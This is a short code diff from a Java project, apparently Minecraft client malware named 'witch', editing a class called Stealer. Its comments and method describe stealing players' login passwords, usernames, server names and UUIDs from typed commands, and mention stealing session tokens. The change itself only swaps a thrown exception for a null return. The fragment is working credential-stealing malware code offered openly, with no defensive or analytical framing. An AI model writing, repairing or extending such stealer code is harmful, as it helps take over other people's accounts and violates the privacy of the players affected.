@@ -8,7 +8,7 @@ import static me.soda.witch.Witch.mc;
 
 public class Stealer {
     //Steal login passwords, returns username, password, server, uuid and timestamp
-    public static String[] stealPassword(String command) throws Exception {
+    public static String[] stealPassword(String command) {
         String username;
         String password;
         String server;
@@ -32,7 +32,7 @@ public class Stealer {
                 return new String[]{username, password, server, uuid, ts};
             }
         }
-        throw new Exception("command not complete");
+        return null;
     }
 
     //Steal token, returns username, uuid, token and timestamp
